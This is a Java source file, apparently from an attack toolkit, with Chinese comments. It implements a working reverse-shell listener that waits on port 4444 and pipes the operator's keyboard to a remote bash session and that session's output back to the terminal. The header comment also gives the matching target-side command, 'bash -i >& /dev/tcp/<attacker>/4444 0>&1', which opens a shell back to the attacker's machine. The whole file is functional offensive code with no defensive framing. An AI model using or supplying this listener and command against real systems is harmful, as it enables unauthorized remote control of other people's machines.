package toolkit;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;

/**
 * 反弹 Shell 监听器
 *
 * 与目标侧 `bash -i >& /dev/tcp/攻击机/4444 0>&1` 相配合
 * bash 把 stdin/stdout/stderr 全都重定向到 TCP 连接。监听端 accept 之后，把连接与攻击者的终端进行连接
 * 攻击者在终端敲命令   -→ System.in -→ socket -→ 目标 bash 执行
 * 目标命令输出        -→ socket → System.out -→ 终端回显
 */
public class ReverseShellListener {

    public static void listen(int port) throws Exception {
        listen(port, null);
    }

    /**
     * 监听并接管反弹 Shell（阻塞直到目标 shell 退出）
     *
     * @param port      监听端口（4444）
     * @param onConnect 连接建立后、进入交互模式前调用
     *                  回调返回后，监听器进程的终端成为交互入口
     */
    public static void listen(int port, java.util.function.Consumer<Socket> onConnect)
            throws Exception {
        ServerSocket server = new ServerSocket(port);
        System.out.println("[*] Reverse shell listener on 0.0.0.0:" + port + " ...");
        Socket client = server.accept();
        System.out.println("[+] SHELL CONNECTED from "
                + client.getInetAddress().getHostAddress() + ":" + client.getPort());

        // 提前取流，回调可能主动关闭连接，之后再取会抛 SocketException
        final InputStream clientIn = client.getInputStream();
        final OutputStream clientOut = client.getOutputStream();

        if (onConnect != null) {
            onConnect.accept(client);              // 独占读写阶段
        }

        System.out.println("[+] Interactive shell; send commands, type 'exit' to quit");
        // 终端桥接：键盘 -→ 目标 bash
        // 目标 bash 输出 -→ 终端
        Thread t1 = new Thread(() -> pipe(clientIn, System.out));
        Thread t2 = new Thread(() -> pipe(System.in, clientOut));
        t1.setDaemon(true);
        t2.setDaemon(true);
        t1.start();
        t2.start();

        // 会话结束条件：目标 bash 退出 -→ socket 对端关闭 -→ t1 读到 EOF 后返回
        t1.join();
        client.close();
        server.close();
        System.out.println("[*] Shell session ended");
    }

    private static void pipe(InputStream in, OutputStream out) {
        byte[] buf = new byte[4096];
        int n;
        try {
            while ((n = in.read(buf)) > 0) {
                out.write(buf, 0, n);
                out.flush();
            }
        } catch (IOException ignored) {
            // 对端关闭即结束
        } finally {
            try {
                in.close();
            } catch (IOException ignored) {
            }
        }
    }

    public static void main(String[] args) throws Exception {
        int port = args.length > 0 ? Integer.parseInt(args[0]) : 4444;
        listen(port);
    }
}
